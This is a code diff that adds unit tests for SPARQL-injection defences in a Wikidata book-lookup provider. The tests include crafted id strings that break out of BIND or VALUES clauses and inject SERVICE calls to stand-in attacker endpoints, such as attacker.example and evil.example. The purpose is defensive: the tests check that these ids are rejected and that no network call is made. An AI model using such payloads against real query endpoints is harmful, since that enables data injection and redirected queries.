@@ -7,12 +7,19 @@ import enrichmentFixture from "../../tests/fixtures/wikidata-search-enrichment.j
 import {
   buildValuesClause,
   candidatesFromSearchResponse,
+  isValidQid,
   precisionFromWikidata,
   wikidataProvider,
 } from "./wikidata";
 
 const ENDPOINT = "https://query.wikidata.org/sparql";
 const SEARCH_ENDPOINT = "https://www.wikidata.org/w/api.php";
+
+// A crafted id that closes the BIND clause this file used to splice
+// externalId into unguarded, and appends a SERVICE clause pointing at an
+// attacker-chosen endpoint. Shared across the injection tests below so a
+// SPARQL syntax detail does not have to be re-derived per test.
+const INJECTION_QID = 'Q1 . } SERVICE <https://attacker.example/sparql> { ?s ?p ?o';
 
 describe("precisionFromWikidata", () => {
   it("maps 11 to day, 10 to month, 9 to year", () => {
@@ -96,6 +103,18 @@ describe("buildValuesClause", () => {
   it("returns an empty string for an empty candidate list", () => {
     expect(buildValuesClause([])).toBe("");
   });
+
+  // The invariant that a qid is shaped like Q\d+ was previously held one
+  // function away, in candidatesFromSearchResponse: buildValuesClause itself
+  // mapped every input unconditionally. It is exported and directly unit
+  // tested, so a future second caller that skips that upstream filter would
+  // reopen the SPARQL injection hole silently. Filtering here makes the
+  // invariant local to the function that actually interpolates into SPARQL.
+  it("drops a crafted qid that would close the VALUES clause, even when passed directly", () => {
+    const injected = 'Q1 } SERVICE <https://attacker.example/sparql> { ?s ?p ?o';
+    expect(buildValuesClause([injected])).toBe("");
+    expect(buildValuesClause(["Q1", injected, "Q2"])).toBe("wd:Q1 wd:Q2");
+  });
 });
 
 describe("candidatesFromSearchResponse", () => {
@@ -113,6 +132,22 @@ describe("candidatesFromSearchResponse", () => {
 
   it("returns an empty array when search is not an array", () => {
     expect(candidatesFromSearchResponse({ search: "nope" })).toEqual([]);
+  });
+
+  it("drops a hit whose id is not shaped like a qid, so it never reaches SPARQL", () => {
+    // buildValuesClause interpolates these straight into a VALUES clause.
+    // These ids come from Wikidata rather than from a request body, so this
+    // is not the client-facing injection path, but an unvalidated string
+    // reaching a query language is the defect either way.
+    expect(
+      candidatesFromSearchResponse({
+        search: [
+          { id: "Q1 } SERVICE <http://evil.example/sparql> { ?s ?p ?o", label: "Crafted" },
+          { id: "not-a-qid", label: "Also bad" },
+          { id: "Q42", label: "Fine" },
+        ],
+      }),
+    ).toEqual([{ qid: "Q42", label: "Fine" }]);
   });
 
   it("skips hits missing an id or label", () => {
@@ -203,5 +238,86 @@ describe("wikidataProvider.searchBooks", () => {
 
     expect(results).toHaveLength(2);
     expect(results[0].seriesName).toBeUndefined();
+  });
+});
+
+describe("isValidQid", () => {
+  it("accepts Q followed by digits", () => {
+    expect(isValidQid("Q1")).toBe(true);
+    expect(isValidQid("Q45875")).toBe(true);
+    expect(isValidQid("Q123456789")).toBe(true);
+  });
+
+  it("rejects a bare number, a lowercase q, and an empty string", () => {
+    expect(isValidQid("45875")).toBe(false);
+    expect(isValidQid("q45875")).toBe(false);
+    expect(isValidQid("")).toBe(false);
+  });
+
+  it("rejects an id that would close the SPARQL BIND clause", () => {
+    expect(isValidQid(INJECTION_QID)).toBe(false);
+    expect(isValidQid("Q1 . }")).toBe(false);
+    expect(isValidQid("Q1; DROP")).toBe(false);
+  });
+});
+
+// A/7 (docs/audits/2026-07-30-full-audit.md): externalId reaches these three
+// methods straight from an anonymous POST /api/track body (via
+// discoverSeriesEntries -> getSeriesEntriesFromAll), so a crafted value
+// must never reach the SPARQL string. Each test proves both that no
+// network call is attempted and that the method degrades to an empty
+// result instead of throwing, so one malformed row does not fail a refresh
+// for every other book in the same slice.
+describe("SPARQL injection guard (A7)", () => {
+  it("getSeriesEntries makes no network call and returns [] for a malformed id", async () => {
+    let called = false;
+    server.use(
+      http.get(ENDPOINT, () => {
+        called = true;
+        return HttpResponse.json(fixture);
+      }),
+    );
+
+    const entries = await wikidataProvider.getSeriesEntries(INJECTION_QID);
+
+    expect(entries).toEqual([]);
+    expect(called).toBe(false);
+  });
+
+  it("getBook makes no network call and returns null for a malformed id", async () => {
+    let called = false;
+    server.use(
+      http.get(ENDPOINT, () => {
+        called = true;
+        return HttpResponse.json({ results: { bindings: [] } });
+      }),
+    );
+
+    const book = await wikidataProvider.getBook(INJECTION_QID);
+
+    expect(book).toBeNull();
+    expect(called).toBe(false);
+  });
+
+  it("getSeries makes no network call and returns null for a malformed id", async () => {
+    let called = false;
+    server.use(
+      http.get(ENDPOINT, () => {
+        called = true;
+        return HttpResponse.json({ results: { bindings: [] } });
+      }),
+    );
+
+    const series = await wikidataProvider.getSeries(INJECTION_QID);
+
+    expect(series).toBeNull();
+    expect(called).toBe(false);
+  });
+
+  it("still serves a well-formed QID through each guarded method", async () => {
+    server.use(http.get(ENDPOINT, () => HttpResponse.json(fixture)));
+
+    const entries = await wikidataProvider.getSeriesEntries("Q45875");
+    expect(entries.length).toBeGreaterThan(0);
   });
 });
